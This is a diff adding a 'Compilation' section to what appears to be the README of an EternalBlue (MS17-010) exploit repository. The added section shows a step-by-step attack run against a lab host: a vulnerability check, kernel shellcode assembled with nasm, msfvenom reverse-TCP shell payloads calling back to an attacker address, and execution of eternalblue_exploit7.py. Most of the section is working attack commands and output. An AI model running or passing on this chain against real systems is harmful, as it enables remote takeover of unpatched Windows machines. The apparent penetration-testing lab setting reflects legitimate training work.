@@ -41,3 +41,32 @@ Anonymous user (null session) get more restriction on default settings of new Wi
 * **Eternalromance** requires access to named pipe. The exploit can target Windows < 8 because the bug for info leak is fixed in Windows 8. The exploit should have a chance to crash a target lower than Eternalblue. I never test a reliable of the exploit.
 * **Eternalsynergy** requires access to named pipe. I believe this exploit is modified from Eternalromance to target Windows 8 and later. Eternalsynergy uses another bug for info leak and does some trick to find executable memory (I do not know how it works because I read only output log and pcap file).
 
+## Compilation
+Eternal Blue
+
+$ python ../checker.py 10.11.1.230
+Target OS: Windows 7 Ultimate N 7600
+The target is not patched
+
+=== Testing named pipes ===
+spoolss: STATUS_ACCESS_DENIED
+samr: STATUS_ACCESS_DENIED
+netlogon: STATUS_ACCESS_DENIED
+lsarpc: STATUS_ACCESS_DENIED
+browser: STATUS_ACCESS_DENIED
+
+Then we use the vulnerability EternalBlue instead of EternalChampion.
+
+$ nasm -f bin eternalblue_kshellcode_x86.asm -o sc_x86_kernel.bin
+$ nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin
+$ msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=10.11.0.199 LPORT=12345
+$ msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.11.0.199 LPORT=11234
+$ cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin
+$ cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
+
+A) both versions of OS
+$ python eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin
+$ python ../eternalblue_exploit7.py 10.11.1.230 sc_all.bin
+
+B) x86
+$ python ../eternalblue_exploit7.py 10.11.1.230 sc_x86.bin
